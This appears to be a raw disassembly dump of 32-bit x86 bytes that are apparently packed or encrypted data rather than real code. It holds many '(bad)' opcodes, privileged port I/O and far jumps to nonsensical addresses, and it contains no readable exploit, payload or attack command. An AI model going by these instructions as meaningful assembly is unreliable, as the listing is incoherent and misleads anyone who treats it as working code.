  4223bc:	and    BYTE PTR [edx-0x51],0xdb
  4223c0:	pop    ecx
  4223c1:	aas    
  4223c2:	js     0x42242d
  4223c4:	aas    
  4223c5:	dec    esp
  4223c6:	mov    bh,0x4f
  4223c8:	pop    ebx
  4223c9:	in     al,dx
  4223ca:	(bad)  
  4223cb:	push   esp
  4223cc:	addr16 fdiv st,st(6)
  4223cf:	push   es
  4223d0:	dec    esi
  4223d1:	push   cs
  4223d2:	int    0x1a
  4223d4:	daa    
  4223d5:	in     eax,0x92
  4223d7:	xor    al,0x7f
  4223d9:	pop    edi
  4223da:	iret   
  4223db:	adc    BYTE PTR [ecx],ch
  4223dd:	neg    edx
  4223df:	sti    
  4223e0:	pop    ecx
  4223e1:	or     DWORD PTR [esi+ecx*8+0x1c],ebx
  4223e5:	add    DWORD PTR [eax-0x307f8925],ebx
  4223eb:	repnz icebp 
  4223ed:	jbe    0x42241f
  4223ef:	cmp    DWORD PTR [edi-0x2eb4d782],esi
  4223f5:	es xchg esp,eax
  4223f7:	mov    BYTE PTR [edx-0xf],dl
  4223fa:	inc    edi
  4223fb:	push   esp
  4223fc:	dec    esp
  4223fd:	cld    
  4223fe:	and    al,0x4a
  422400:	push   ds
  422401:	mov    ebx,0xb7977d4d
  422406:	(bad)  
  422408:	push   0xffffffca
  42240a:	jo     0x422420
  42240c:	test   eax,0xb18b2a
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	dec    esp
  422481:	push   ecx
  422482:	adc    dl,BYTE PTR [esi+0x40]
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	xor    dh,ch
  42248e:	mov    ds:0x8375df1e,al
  422493:	mov    eax,ds:0xd7dcb81
  422498:	mov    dl,0x8
  42249a:	(bad)  
  42249b:	in     al,dx
  42249c:	pop    esp
  42249d:	(bad)
  4224a0:	sub    BYTE PTR [ebx+0x2d31fae1],ch
  4224a6:	xchg   edx,eax
  4224a7:	mov    esp,0xc7d18ce3
  4224ac:	pop    edx
  4224ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ae:	int3   
  4224af:	lahf   
  4224b0:	mov    BYTE PTR [edx],bh
  4224b2:	inc    esp
  4224b3:	mov    bl,0x5e
  4224b5:	adc    edx,DWORD PTR cs:[edx]
  4224b8:	(bad)  
  4224b9:	mov    ch,0x8a
  4224bb:	fwait
  4224bc:	push   es
  4224bd:	and    DWORD PTR ds:0x519acb92,ebp
  4224c3:	popf   
  4224c4:	push   eax
  4224c5:	pop    ebp
  4224c6:	add    ebx,DWORD PTR [ebp-0x7cd45841]
  4224cc:	pop    edx
  4224cd:	dec    ecx
  4224ce:	shl    BYTE PTR [edi-0x21],1
  4224d1:	(bad)  
  4224d2:	(bad)  
  4224d3:	mov    ebp,edi
  4224d5:	sbb    ebp,DWORD PTR [edi+0x63]
  4224d8:	retf   0xc64f
  4224db:	or     al,0x1a
  4224dd:	sbb    eax,0xf75373ac
  4224e2:	mov    ds:0x44a0684c,eax
  4224e7:	sub    al,0xfd
  4224e9:	popa   
  4224ea:	inc    eax
  4224eb:	fldenv ds:0x5561ed1e
  4224f1:	retf   
  4224f2:	xor    dh,BYTE PTR [ebp-0x45e4a5b3]
  4224f8:	cmp    al,0x62
  4224fa:	adc    DWORD PTR [eax+edi*1-0x5e],edi
  4224fe:	xor    eax,0xfffc40e2
  422503:	xchg   edi,eax
  422504:	repz jmp 0xc202584f
  42250a:	inc    edx
  42250b:	dec    ebx
  42250c:	push   eax
  42250d:	or     al,0x90
  42250f:	dec    ebp
  422510:	sbb    dl,BYTE PTR [eax+0x75]
  422513:	fwait
  422514:	(bad)  
  422515:	lods   eax,DWORD PTR ds:[esi]
  422516:	call   DWORD PTR [ebp-0x14]
  422519:	mov    eax,0xac1c052c
  42251e:	arpl   WORD PTR fs:[ebx],bp
  422521:	daa    
  422522:	and    dh,BYTE PTR [edi+edi*1]
  422525:	sub    DWORD PTR [ebx+0x48],0x7c3ca17d
  42252c:	enter  0xe09b,0x72
  422530:	pushf  
  422531:	mov    ebp,0xf241c0b
  422536:	ret    
  422537:	loope  0x422540
  422539:	neg    DWORD PTR [ebx-0x80]
  42253c:	and    edx,DWORD PTR [esi-0x3b5e0d4e]
  422542:	jbe    0x422526
  422544:	pop    edi
  422545:	add    eax,0x490fc222
  42254a:	sbb    eax,ebx
  42254c:	add    eax,0x520cc769
  422551:	xlat   BYTE PTR ds:[ebx]
  422552:	int    0xce
  422554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422555:	xor    DWORD PTR [eax-0xf2d98ae],ebx
  42255b:	retf   
  42255c:	sbb    eax,0xf3873f09
  422561:	mov    eax,ds:0xfdb30fec
  422566:	rol    DWORD PTR [ebp-0x2c17d7d2],cl
  42256c:	adc    al,0x40
  42256e:	out    0xc2,al
  422570:	cmc    
  422571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422572:	sub    ebx,DWORD PTR [edx+ebx*2]
  422575:	aad    0x9a
  422577:	sar    BYTE PTR [edx-0x22ced61a],1
  42257d:	ds and edx,eax
  422580:	lods   eax,DWORD PTR ds:[esi]
  422581:	popf   
  422582:	cmp    DWORD PTR [ecx-0x29],eax
  422585:	mov    al,ds:0xcc098cec
  42258a:	stos   DWORD PTR es:[edi],eax
  42258b:	out    dx,al
  42258c:	mov    eax,ds
  42258e:	dec    esi
  42258f:	test   al,0x0
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x7a6e5d08]
  422602:	mov    eax,0x16e4498
  422607:	add    BYTE PTR [ecx+eax*1],al
  42260a:	add    BYTE PTR [eax],al
  42260c:	cs cmp ecx,ecx
  42260f:	inc    edi
  422610:	jle    0x422656
  422612:	(bad)  
  422613:	cmc    
  422614:	mov    bl,0x2d
  422616:	xor    al,0x42
  422618:	and    al,0x7f
  42261a:	adc    DWORD PTR [eax],ecx
  42261c:	les    esi,FWORD PTR [ebx]
  42261e:	mov    esi,0x49c8b0ec
  422623:	push   cs
  422624:	mov    ecx,DWORD PTR [ebx+eiz*4]
  422627:	mov    al,ds:0x4db460e4
  42262c:	push   esp
  42262d:	dec    ecx
  42262e:	push   ecx
  42262f:	mov    edx,0x88e61d1c
  422634:	in     al,0x60
  422636:	in     eax,0x75
  422638:	dec    esi
  422639:	cmp    BYTE PTR [edx],bl
  42263b:	and    bl,BYTE PTR [ecx+0x51]
  42263e:	sbb    eax,DWORD PTR [edi-0x2]
  422641:	adc    dh,BYTE PTR [eax-0x6e]
  422644:	fadd   st(3),st
  422646:	pop    ebp
  422647:	mov    esi,0x4b665a3b
  42264c:	jne    0x4225d9
  42264e:	pop    edx
  42264f:	js     0x4225f8
  422651:	cmp    edx,esp
  422653:	xor    esi,DWORD PTR [eax-0x2e]
  422656:	ror    DWORD PTR [edx],0xad
  422659:	lahf   
  42265a:	sbb    BYTE PTR [edi-0x5a],0x88
  42265e:	xchg   ebx,eax
  42265f:	in     eax,dx
  422660:	push   ss
  422661:	dec    esi
  422662:	and    eax,0xc6dfb293
  422667:	out    dx,al
  422668:	mov    al,0x5e
  42266a:	cmp    al,0x21
  42266c:	shl    BYTE PTR [ecx],0xb8
  42266f:	mov    ds:0x3639f2b4,al
  422674:	lock inc edi
  422676:	adc    bh,bh
  422678:	push   esi
  422679:	hlt    
  42267a:	stc    
  42267b:	in     al,0xb7
  42267d:	and    BYTE PTR [edi+eiz*4-0x2c],dh
  422681:	xchg   ecx,eax
  422682:	rcr    BYTE PTR [esp+edi*1-0x13],cl
  422686:	jecxz  0x4226c3
  422688:	and    ah,BYTE PTR [eax+0x11f34ce3]
  42268e:	sti    
  42268f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422690:	jge    0x4226be
  422692:	push   esi
  422693:	(bad)  
  422694:	ror    BYTE PTR [ecx-0x6574c4fb],cl
  42269a:	cmp    ebp,DWORD PTR ds:0x58e7c508
  4226a0:	(bad)  
  4226a1:	mov    cl,0x81
  4226a3:	idiv   bl
  4226a5:	dec    ebp
  4226a6:	cmc    
  4226a7:	pop    ds
  4226a8:	sti    
  4226a9:	je     0x422699
  4226ab:	push   cs
  4226ac:	push   ebp
  4226ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ae:	xchg   esp,ebp
  4226b0:	lods   eax,DWORD PTR ds:[esi]
  4226b1:	push   0xa8d5c88e
  4226b6:	xor    BYTE PTR [edi+0xcee960],dh
  4226bc:	add    ebx,edi
  4226be:	jo     0x4226fb
  4226c0:	outs   dx,DWORD PTR ds:[esi]
  4226c1:	jp     0x4226e7
  4226c3:	fild   WORD PTR [ebx]
  4226c5:	xchg   ebx,eax
  4226c6:	mov    dl,0x4e
  4226c8:	jmp    0x5731:0x4f31f7bc
  4226cf:	xchg   esi,eax
  4226d0:	or     BYTE PTR ds:0xdb30c775,ch
  4226d6:	mov    edi,fs
  4226d8:	scas   eax,DWORD PTR es:[edi]
  4226d9:	adc    al,0x69
  4226db:	sbb    eax,0xecc6f9f9
  4226e0:	dec    edx
  4226e1:	rcl    BYTE PTR [eax+0x78343103],1
  4226e7:	and    ch,dh
  4226e9:	xor    ebx,ecx
  4226eb:	cld    
  4226ec:	fisub  DWORD PTR [edx+0x4d773451]
  4226f2:	sub    BYTE PTR [ecx-0x7c57f553],ch
  4226f8:	jl     0x4226f7
  4226fa:	push   eax
  4226fb:	jg     0x4226ec
  4226fd:	in     al,dx
  4226fe:	or     BYTE PTR [bx],bh
  422701:	je     0x422725
  422703:	jle    0x4226e2
  422705:	imul   edx,DWORD PTR [edi+0x2c],0xffffffaa
  422709:	lds    esp,FWORD PTR [ebx]
  42270b:	imul   eax,DWORD PTR [ecx+ecx*8+0xd59b],0x0
	...
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x407f01c8
  422781:	adc    BYTE PTR [edi+ebp*4+0x48],bl
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	jg     0x42276f
  42278e:	jp     0x422793
  422790:	push   ds
  422791:	add    DWORD PTR [eax],esp
  422793:	sub    eax,0x878313aa
  422798:	add    al,0xcb
  42279a:	ins    DWORD PTR es:[edi],dx
  42279b:	sbb    esi,esp
  42279d:	add    BYTE PTR [eax],al
  42279f:	(bad)  
  4227a0:	out    dx,eax
  4227a1:	retf   0x5983
  4227a4:	scas   eax,DWORD PTR es:[edi]
  4227a5:	sbb    BYTE PTR [ecx],ah
  4227a7:	std    
  4227a8:	cmp    eax,ebx
  4227aa:	cmp    dh,bl
  4227ac:	add    BYTE PTR [edx],bh
  4227ae:	sub    DWORD PTR [ebx+0x2f],ebx
  4227b1:	inc    eax
  4227b2:	jmp    0xd27c:0xa60d31f1
  4227b9:	mov    eax,0x76f4cadd
  4227be:	jo     0x4227d6
  4227c0:	add    al,0x7a
  4227c2:	adc    DWORD PTR [ebx],edx
  4227c4:	push   cs
  4227c5:	inc    eax
  4227c6:	mov    esp,0xca63418d
  4227cb:	lods   al,BYTE PTR ds:[esi]
  4227cc:	call   0x1728:0xc0204909
  4227d3:	fld    DWORD PTR [edi+ebx*8-0x2b]
  4227d7:	jbe    0x4227bc
  4227d9:	add    BYTE PTR [ebx+0x72599f99],bh
  4227df:	cwde   
  4227e0:	jmp    0xebbd:0x3d2839c3
  4227e7:	xchg   esi,eax
  4227e8:	push   cs
  4227e9:	sbb    dh,0x75
  4227ec:	mov    ds:0x61838e6e,eax
  4227f1:	and    BYTE PTR [edi-0x63db6687],bl
  4227f7:	sbb    al,0x9
  4227f9:	add    eax,0xaab6e22c
  4227fe:	pop    esi
  4227ff:	mov    cl,0xcb
  422801:	lods   al,BYTE PTR ds:[esi]
  422802:	and    edx,DWORD PTR [edx-0x5b]
  422805:	aas    
  422806:	mov    edx,0x19c8130f
  42280b:	in     al,dx
  42280c:	in     eax,0xbc
  42280e:	and    bh,cl
  422810:	and    DWORD PTR [edi],esp
  422812:	in     eax,0x6a
  422814:	mov    edi,0xec994b2a
  422819:	cld    
  42281a:	and    DWORD PTR [ebx-0x3b69fff4],esp
  422820:	fptan  
  422822:	popa   
  422823:	add    BYTE PTR [edi+0x51],al
  422826:	ja     0x422851
  422828:	or     edi,DWORD PTR [esi+0x42]
  42282b:	xchg   ebx,eax
  42282c:	mov    ecx,0x9d601caf
  422831:	test   eax,0x4ed5f162
  422836:	popf   
  422837:	(bad)
  42283b:	out    dx,al
  42283c:	aam    0xc7
  42283e:	out    0xc3,al
  422840:	test   eax,0x10c837d9
  422845:	adc    ebx,eax
  422847:	pusha  
  422848:	imul   esi,DWORD PTR [eax+0x36],0xffffffef
  42284c:	dec    esi
  42284d:	mov    es,WORD PTR [edi-0x67]
  422850:	inc    edx
  422851:	test   BYTE PTR [ecx+edi*4-0x17],cl
  422855:	cmp    al,0x38
  422857:	push   edx
  422858:	push   ebp
  422859:	push   0xaf913c1
  42285e:	mov    bl,BYTE PTR [ecx+0x24cb08b]
  422864:	add    edi,edx
  422866:	and    ecx,DWORD PTR [eax+0xcec7624]
  42286c:	mov    ebx,0x6926200f
  422871:	inc    edx
  422872:	repnz mov ecx,0xe7b32182
  422878:	push   ds
  422879:	pop    ebp
  42287a:	call   0xfefdd805
  42287f:	popa   
  422880:	mov    esp,0xea74aa3b
  422885:	test   eax,0x33371b5f
  42288a:	xor    dh,BYTE PTR [ecx-0x45]
  42288d:	nop
  42288e:	(bad)  [ebp+0x0]
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228ed
  422901:	enter  0xd27c,0x4c
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	cmc    
  42290d:	jl     0x4228c8
  42290f:	mov    ds:0xba5461d6,al
  422914:	imul   DWORD PTR [ebp+0x2e]
  422917:	add    eax,0x9ed1ccaa
  42291c:	inc    eax
  42291d:	inc    edx
  42291e:	cmp    edx,ecx
  422920:	ja     0x422955
  422922:	add    BYTE PTR [eax+ebp*4-0x1d],ch
  422926:	add    eax,0x99a014e1
  42292b:	mov    eax,ds:0xe7e2b6a
  422930:	cmp    al,0x18
  422932:	sbb    DWORD PTR [ebx],edx
  422934:	jmp    0x422964
  422936:	xor    DWORD PTR [edx],esi
  422938:	out    0x8,eax
  42293a:	ret    0xd333
  42293d:	ss (bad) 
  42293f:	sti    
  422940:	(bad)  
  422941:	sahf   
  422942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422943:	dec    esi
  422944:	int3   
  422945:	cdq    
  422946:	call   0x60452e53
  42294b:	and    BYTE PTR [ebx+ecx*1-0x17],ch
  42294f:	out    dx,al
  422950:	mov    dh,0xc0
  422952:	xor    dl,BYTE PTR [esi]
  422954:	push   ebp
  422955:	pop    esi
  422956:	scas   eax,DWORD PTR es:[edi]
  422957:	xchg   bh,dl
  422959:	xlat   BYTE PTR ds:[ebx]
  42295a:	icebp  
  42295b:	jmp    0x4229a9
  42295d:	pop    es
  42295e:	out    dx,al
  42295f:	cs ret 0xa31f
  422963:	test   esi,edi
  422965:	shl    bl,cl
  422967:	cmp    DWORD PTR [eax],esi
  422969:	fcom   DWORD PTR [edx+edi*1+0x64]
  42296d:	into   
  42296e:	mov    al,ds:0x5969235a
  422973:	adc    esp,esi
  422975:	(bad)  [ecx+edx*8+0x21]
  422979:	sbb    eax,0x40715783
  42297e:	ret    0x6ec6
  422981:	inc    esi
  422982:	sub    al,0x9e
  422984:	lea    esi,[eax]
  422986:	mov    eax,0x402e4de7
  42298b:	jmp    0x42298f
  42298d:	or     dh,BYTE PTR ds:0x9fa14628
  422993:	mov    si,0xeac9
  422997:	mul    esi
  422999:	mov    ds:0xcd5c1d25,eax
  42299e:	aaa    
  42299f:	adc    DWORD PTR [ebx+edx*8],ebx
  4229a2:	shl    DWORD PTR ds:0x26627311,0x5f
  4229a9:	cmp    DWORD PTR [ebx],eax
  4229ab:	fwait
  4229ac:	dec    edi
  4229ad:	data16 mov ss,WORD PTR [esi]
  4229b0:	or     edi,ebp
  4229b2:	pop    edx
  4229b3:	repz mov ebp,0x97829495
  4229b9:	addr16 jmp 0x37a1:0xf09c285d
  4229c1:	adc    DWORD PTR [ebx-0x51],esp
  4229c4:	bound  eax,QWORD PTR [ecx+0x27ac7220]
  4229ca:	rcl    DWORD PTR [esi],cl
  4229cc:	cli    
  4229cd:	leave  
  4229ce:	cmp    DWORD PTR [edi],eax
  4229d0:	cld    
  4229d1:	sub    al,0xdb
  4229d3:	ror    BYTE PTR [ecx],cl
  4229d5:	mov    WORD PTR [edx],ss
  4229d7:	cmp    esi,ebx
  4229d9:	mov    ds:0x9c86d373,al
  4229de:	sub    eax,DWORD PTR [eax+ecx*1+0x41]
  4229e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e3:	mov    cs,ebp
  4229e5:	inc    ebx
  4229e6:	mul    DWORD PTR [eax-0x5]
  4229e9:	jge    0x422a18
  4229eb:	and    BYTE PTR [ebp-0x42],al
  4229ee:	jb     0x422972
  4229f0:	test   DWORD PTR [esi-0x4c],edx
  4229f3:	dec    esp
  4229f4:	push   esp
  4229f5:	cmc    
  4229f6:	daa    
  4229f7:	and    ah,BYTE PTR [ecx*2+0x33218c90]
  4229fe:	push   ebx
  4229ff:	mov    WORD PTR [eax+0x150d09eb],es
  422a05:	aam    0xe7
  422a07:	neg    DWORD PTR [ecx-0x9]
  422a0a:	les    eax,FWORD PTR [ecx-0x3ebdd14e]
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	push   ss
  422a81:	mov    ds:0x71507792,al
  422a86:	add    DWORD PTR [eax],eax
  422a88:	add    al,0x1
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	arpl   WORD PTR [eax],bx
  422a8e:	mov    dl,0x35
  422a90:	inc    esi
  422a91:	sub    al,0x7
  422a93:	cs push eax
  422a95:	and    DWORD PTR [eax+0x7ff3bfc1],edi
  422a9b:	mov    BYTE PTR [ebx+0x6c],cl
  422a9e:	mov    al,cl
  422aa0:	sub    bh,dh
  422aa2:	lock leave 
  422aa4:	sbb    ebp,DWORD PTR [edx+0x539ec56a]
  422aaa:	pop    esp
  422aab:	sbb    al,0xba
  422aad:	cmp    DWORD PTR ds:0xb33aaede,ebp
  422ab3:	mov    dl,0xc0
  422ab5:	imul   edi,DWORD PTR [ebp+0x31],0x64
  422ab9:	sub    ebp,eax
  422abb:	outs   dx,BYTE PTR ds:[esi]
  422abc:	cmp    ah,BYTE PTR [ecx+0x2559036e]
  422ac2:	xor    ecx,ebx
  422ac4:	loop   0x422a4d
  422ac6:	inc    eax
  422ac7:	imul   ecx,DWORD PTR [eax+0x28],0xffffffce
  422acb:	mov    dl,0xbc
  422acd:	adc    al,0x8a
  422acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ad0:	repz dec esp
  422ad2:	mov    eax,ds:0x2b7802b6
  422ad7:	loope  0x422b09
  422ad9:	inc    eax
  422ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422adb:	ss out 0x31,eax
  422ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422adf:	fs call 0xe06a8917
  422ae5:	inc    ebx
  422ae6:	or     eax,0x62f9695f
  422aeb:	xchg   edx,eax
  422aec:	idiv   esi
  422aee:	mov    ebp,DWORD PTR [ebx+eax*8]
  422af1:	call   0xd752:0xa16158f5
  422af8:	xadd   ch,bh
  422afb:	stos   DWORD PTR es:[edi],eax
  422afc:	jmp    0x346777a0
  422b01:	xor    al,0x8f
  422b03:	or     al,0x6b
  422b05:	mov    dh,0xa8
  422b07:	and    DWORD PTR [edx],esp
  422b09:	jnp    0x422b6b
  422b0b:	inc    edi
  422b0c:	aad    0x52
  422b0e:	jmp    0x6b691c1d
  422b13:	lods   eax,DWORD PTR ds:[esi]
  422b14:	ror    ebx,0x90
  422b17:	enter  0x407a,0x25
  422b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b1c:	outs   dx,BYTE PTR ds:[esi]
  422b1d:	dec    eax
  422b1e:	cmp    DWORD PTR [ecx-0x15],0x937872fb
  422b25:	xlat   BYTE PTR ds:[ebx]
  422b26:	ins    BYTE PTR es:[edi],dx
  422b27:	sbb    eax,0x480d0524
  422b2c:	add    eax,0xd15d5078
  422b31:	mov    eax,0x2bb616a9
  422b36:	sub    edx,DWORD PTR [edi-0x1b]
  422b39:	xchg   ebx,eax
  422b3a:	das    
  422b3b:	mov    ds:0xb7848466,eax
  422b40:	lahf   
  422b41:	jne    0x422ad7
  422b43:	out    0x3f,al
  422b45:	(bad)  
  422b46:	out    0x43,al
  422b48:	icebp  
  422b49:	or     eax,0x14470280
  422b4e:	jp     0x422b71
  422b50:	and    BYTE PTR [ebx],bl
  422b52:	out    0x56,eax
  422b54:	push   ecx
  422b55:	aas    
  422b56:	and    DWORD PTR [edi+0x2fc1314d],0x377ab91
  422b60:	les    edx,FWORD PTR [edx-0x2d3ee885]
  422b66:	loopne 0x422b4c
  422b68:	add    eax,DWORD PTR [edi+0x5e96ba77]
  422b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b6f:	loop   0x422b7b
  422b71:	es mov edx,0x606f76d8
  422b77:	adc    dh,BYTE PTR [edi+0x32]
  422b7a:	lods   eax,DWORD PTR ds:[esi]
  422b7b:	out    dx,al
  422b7c:	and    dl,BYTE PTR [edx-0x6c]
  422b7f:	mov    ebp,0x86406fb5
  422b84:	std    
  422b85:	push   esp
  422b86:	pop    edx
  422b87:	adc    al,BYTE PTR [ecx-0xa]
  422b8a:	mov    ebp,0x47c6c488
  422b8f:	jo     0x422b91
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x1bb4b264]
  422c02:	daa    
  422c03:	adc    al,0x54
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	mov    dl,0x64
  422c0e:	call   0x8312816
  422c13:	and    ch,BYTE PTR [eax]
  422c15:	sahf   
  422c16:	mov    eax,ds:0x1c01f6bb
  422c1b:	jge    0x422bdc
  422c1d:	iret   
  422c1e:	cmp    DWORD PTR [ebx+0xeb00068],esp
  422c24:	sbb    BYTE PTR [edx],bl
  422c26:	jl     0x422c79
  422c28:	mov    fs,WORD PTR [eax-0x75]
  422c2b:	stc    
  422c2c:	mov    ebx,0x30685380
  422c31:	or     eax,0xfbb6370d
  422c36:	(bad)  
  422c37:	xor    al,0x26
  422c39:	jle    0x422c90
  422c3b:	test   eax,0x50829daf
  422c40:	sbb    al,0xa6
  422c42:	add    BYTE PTR [ebp+0x7f7a8d66],al
  422c48:	scas   eax,DWORD PTR es:[edi]
  422c49:	js     0x422c25
  422c4b:	hlt    
  422c4c:	xor    edx,0x6a501ae5
  422c52:	mov    ds:0xa4e26533,eax
  422c57:	cdq    
  422c58:	loop   0x422c8a
  422c5a:	jmp    0xdcff9854
  422c5f:	push   eax
  422c60:	out    0x4b,al
  422c62:	js     0x422ca3
  422c64:	mov    ah,0xa0
  422c66:	std    
  422c67:	pop    esp
  422c68:	pop    edi
  422c69:	pop    esp
  422c6a:	cli    
  422c6b:	stc    
  422c6c:	sub    ch,BYTE PTR [ecx-0x29eab2c6]
  422c72:	dec    DWORD PTR [ebp-0x20]
  422c75:	add    ecx,ecx
  422c77:	jl     0x422ce9
  422c79:	mov    cs,WORD PTR [edx+0xdaa4930]
  422c7f:	mov    ebx,0x82ae1bac
  422c84:	es aaa 
  422c86:	mov    cl,0xb4
  422c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c89:	xlat   BYTE PTR ds:[ebx]
  422c8a:	xchg   edx,eax
  422c8b:	push   esi
  422c8c:	lahf   
  422c8d:	inc    ebx
  422c8e:	jle    0x422cde
  422c90:	push   cs
  422c91:	mov    BYTE PTR [edx+0x7002c426],ah
  422c97:	shr    bl,1
  422c99:	ja     0x422c85
  422c9b:	adc    DWORD PTR [ecx-0x7797d6cf],esp
  422ca1:	jnp    0x422d1e
  422ca3:	fsub   QWORD PTR [esp+eiz*2]
  422ca6:	gs cld 
  422ca8:	cmp    al,0xaf
  422caa:	pop    edx
  422cab:	jo     0x422d06
  422cad:	dec    esp
  422cae:	adc    eax,0x32206e6a
  422cb3:	aad    0xda
  422cb5:	cwde   
  422cb6:	mul    al
  422cb8:	or     eax,ecx
  422cba:	jg     0x422ca0
  422cbc:	add    ch,BYTE PTR [esi-0x20]
  422cbf:	shl    BYTE PTR [eax],cl
  422cc1:	bnd jle 0x422cb4
  422cc4:	push   es
  422cc5:	(bad)  
  422cc6:	cmp    eax,esp
  422cc8:	sar    DWORD PTR [ebx+0x77],1
  422ccb:	rcr    BYTE PTR [eax],0xb9
  422cce:	aam    0x2e
  422cd0:	jge    0x422cfe
  422cd2:	shl    DWORD PTR [eax],0x8f
  422cd5:	and    DWORD PTR [eax],0x49
  422cd8:	mov    al,ds:0x26c5fbf3
  422cdd:	mov    bh,0x5d
  422cdf:	add    al,0xf2
  422ce1:	xor    cl,BYTE PTR [edx+esi*1-0xf]
  422ce5:	bsr    edx,DWORD PTR [eax-0x25]
  422ce9:	popa   
  422cea:	js     0x422d2c
  422cec:	(bad)  
  422ced:	repnz outs dx,BYTE PTR ds:[esi]
  422cef:	hlt    
  422cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cf1:	sub    BYTE PTR [edi-0x5f],bh
  422cf4:	jmp    0x53bf5a01
  422cf9:	daa    
  422cfa:	fadd   st,st(3)
  422cfc:	dec    esi
  422cfd:	push   es
  422cfe:	dec    eax
  422cff:	les    ebp,FWORD PTR [ecx]
  422d01:	dec    ebx
  422d02:	mov    fs,WORD PTR [eax+0x2dfad131]
  422d08:	adc    eax,0x5951992f
  422d0d:	ins    DWORD PTR es:[edi],dx
  422d0e:	add    al,0x8e
	...
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    eax,eax
  422d81:	(bad)
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	pop    es
  422d8d:	mov    bl,0xc6
  422d8f:	fld    QWORD PTR ss:[ebp+0x70]
  422d93:	imul   ebx,DWORD PTR [edx+0x31],0xffffff98
  422d97:	ror    DWORD PTR [esi-0x5b],cl
  422d9a:	xchg   esp,eax
  422d9b:	xor    BYTE PTR [ecx+0xf],al
  422d9e:	mov    al,0x91
  422da0:	lods   eax,DWORD PTR ds:[esi]
  422da1:	mov    dh,0x90
  422da3:	mov    dl,0x21
  422da5:	pop    eax
  422da6:	fisttp WORD PTR [ecx]
  422da8:	nop
  422da9:	push   ss
  422daa:	push   cs
  422dab:	imul   esp,DWORD PTR [ecx],0xc7341503
  422db1:	in     eax,dx
  422db2:	stos   DWORD PTR es:[edi],eax
  422db3:	mov    gs,WORD PTR [ecx-0x2]
  422db6:	dec    esp
  422db7:	out    0x55,eax
  422db9:	adc    esi,edx
  422dbb:	push   0x62633073
  422dc0:	mov    bh,0x1f
  422dc2:	leave  
  422dc3:	fs call 0x75a4:0xe6de2da1
  422dcb:	lock inc edi
  422dcd:	out    0x78,al
  422dcf:	(bad)  
  422dd0:	bound  edx,QWORD PTR [edi+0x74]
  422dd3:	mov    bl,0xfe
  422dd5:	daa    
  422dd6:	loope  0x422e07
  422dd8:	bound  esp,QWORD PTR [ebp+0x25d2d275]
  422dde:	fsub   QWORD PTR [ebp-0x7d]
  422de1:	dec    ecx
  422de2:	dec    ecx
  422de3:	loope  0x422db1
  422de5:	push   edi
  422de6:	fisttp WORD PTR [ecx]
  422de8:	ds pop edx
  422dea:	xor    al,ch
  422dec:	jns    0x422e46
  422dee:	stos   BYTE PTR es:[edi],al
  422def:	pop    edi
  422df0:	jo     0x422d9b
  422df2:	enter  0xa647,0xa9
  422df6:	dec    dh
  422df8:	or     ah,dh
  422dfa:	ja     0x422d81
  422dfc:	xchg   esp,eax
  422dfd:	es dec edx
  422dff:	test   BYTE PTR [ebx],cl
  422e01:	mov    eax,0x65c0b878
  422e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e07:	jno    0x422db9
  422e09:	push   esi
  422e0a:	mov    edi,0x678fa7f5
  422e0f:	sub    dh,ah
  422e11:	jbe    0x422dd0
  422e13:	in     eax,dx
  422e14:	enter  0xd0e3,0xdf
  422e18:	lahf   
  422e19:	aas    
